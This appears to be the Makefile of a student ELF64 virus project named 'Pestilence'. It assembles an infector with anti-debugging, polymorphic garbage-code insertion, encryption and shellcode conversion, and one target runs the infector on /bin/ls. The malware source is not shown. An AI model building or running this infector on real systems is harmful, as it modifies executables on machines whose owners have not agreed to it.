NAME=Pestilence

DEBUG=1
DEBUG_EXT=1
FLAGS_IGNORE_WARNINGS=-Wno-unused-value -Wno-unused-variable -Wno-unused-parameter
FLAGS = -MD -fno-stack-protector -fPIC -fPIE -Wextra -Wall -fno-tree-loop-distribute-patterns -D DEBUG=$(DEBUG) -D DEBUG_EXT=$(DEBUG_EXT) $(FLAGS_IGNORE_WARNINGS)

SRC_DIR				= .
TMP_DIR				= .tmp
OBJ_DIR				= $(TMP_DIR)/obj

TABLE_C = $(TMP_DIR)/table.c
LIBFLAGS = -I lib/infect -I lib/ft_lib -I lib/crypto -I lib/formats -I lib/hacks
VIRUS = virus

FTLIB_SRC = ft_io.c ft_string.c ft_lib.c call.s
FORMATS_SRC = elf64.c
CRYPTO_SRC = encrypt.c compress_use.c compress.c decrypt.c decrypt_block.s
HACKS_SRC = antidebug.c remote.c checkproc.c
INFECT_SRC = infect.c infect_dir.c
POLY_SRC = poly.c

FTLIB = $(addprefix lib/ft_lib/, $(FTLIB_SRC))
FORMATS = $(addprefix lib/formats/, $(FORMATS_SRC))
CRYPTO = $(addprefix lib/crypto/, $(CRYPTO_SRC))
HACKS = $(addprefix lib/hacks/, $(HACKS_SRC))
INFECT = $(addprefix lib/infect/, $(INFECT_SRC))
POLY = $(addprefix lib/poly/, $(POLY_SRC))

OBJ_LIBS = $(addprefix $(OBJ_DIR)/, lib/ft_lib lib/ft_formats lib/crypto lib/hacks lib lib/poly)

SRC_C = virus/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO) $(HACKS) $(POLY)
SRC_S = virus/start.s

OBJ_NO_TABLE=	$(addprefix $(OBJ_DIR)/, $(patsubst %.s,%.o, $(patsubst %.c,%.o,$(SRC_C)))) \
		$(addprefix $(OBJ_DIR)/, $(SRC_S:.s=.o))
OBJ =		$(OBJ_NO_TABLE) \
		$(addprefix $(OBJ_DIR)/, $(patsubst %.c,%.o,$(TABLE_C)))

SRC_INF_C = infector/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO) $(POLY)

OBJ_INF	=	$(addprefix $(OBJ_DIR)/, $(patsubst %.s,%.o, $(patsubst %.c,%.o,$(SRC_INF_C))))

DEP =		$(addprefix $(OBJ_DIR)/, $(OBJ:.o=.d)) \
		$(addprefix $(OBJ_DIR)/, $(OBJ_INF:.o=.d))

VIRUS = $(TMP_DIR)/virus.template
VIRUS_X = $(TMP_DIR)/virus_shellcode.c

LD_RULES = virus/rules.lds

all: $(NAME) fn_list

$(NAME): $(VIRUS_X) $(OBJ_INF)
	gcc -o $(NAME) $(OBJ_INF) $(VIRUS_X)

$(VIRUS_X): $(VIRUS)
	cp $< virus_shellcode
	xxd -i virus_shellcode $(VIRUS_X)
	rm virus_shellcode

$(VIRUS): $(OBJ) $(LD_RULES)
	ld -o $@ -T $(LD_RULES) $(OBJ)
	nm -n .tmp/virus.template | grep ' B \| b ' | diff - /dev/null || rm $(VIRUS)

$(TMP_DIR):
	mkdir -p $@

$(OBJ_DIR):
	mkdir -p $@
	python -c 'import os,sys;dirs=[ r for r,s,f in os.walk(".") if r != "."];[os.makedirs(os.path.join(sys.argv[1],i)) for i in dirs]' $(OBJ_DIR)/.
	rm -rf $(OBJ_DIR)/others

##
## GARBAGE CODE
##

$(OBJ_DIR)/table.o: $(TABLE_C) | $(OBJ_DIR)
	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $@

GARBAGE_CF = $(TMP_DIR)/garbage.txt

fn_list: $(VIRUS)
	nm --defined-only -n .tmp/virus.template | grep -v '\.' | cut -d ' ' -f 3 | sed -e '/^cmpr_start$$/,$$d' | grep -v DECRYPT_ROUTINE | grep -v ENCRYPT_ROUTINE | sort > fn_list

$(OBJ_DIR)/%.s: $(OBJ_DIR)/%.gs
	./others/scripts/add_garbage $< -p 200 -l toto $(shell cat fn_list) || cp $< $@

$(TABLE_C): $(OBJ_NO_TABLE)
	nm $(OBJ_NO_TABLE) | grep .garb_start | wc -l > $(GARBAGE_CF)
	./others/scripts/gen_garbage_table -n `cat $(GARBAGE_CF)` -o $@

$(OBJ_DIR)/%.o: $(OBJ_DIR)/%.s | $(OBJ_DIR)
	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $@

$(OBJ_DIR)/%.gs: $(SRC_DIR)/%.c | $(OBJ_DIR) $(TMP_LIB_DIR)
	gcc -MD $(FLAGS) $(LIBFLAGS) -S $< -o $@

#$(OBJ_DIR)/%.s: $(SRC_DIR)/%.s | $(OBJ_DIR) $(TMP_LIB_DIR)
#	cp $< $@

##
## END
##

$(OBJ_DIR)/%.o: %.s | $(OBJ_DIR)
	nasm -f elf64 $< -o $@

clean:
	rm -rf $(TMP_DIR)

fclean: clean
	rm -rf $(NAME)

re: fclean
	echo $(DEP)
	make

-include $(DEP)

.PHONY: all re clean fclean test unit_test test_corruptor

test_corruptor: all
	echo 'int main(){printf("SALUT\\n");}' > /tmp/oki.c
	gcc /tmp/oki.c -o /tmp/oki
	(cd others/test && ./corruptor.sh ./../../$(NAME) /tmp/oki)
	

test: all
	(cd others/test && ./run.sh)

ls: all
	./$(NAME) /bin/ls
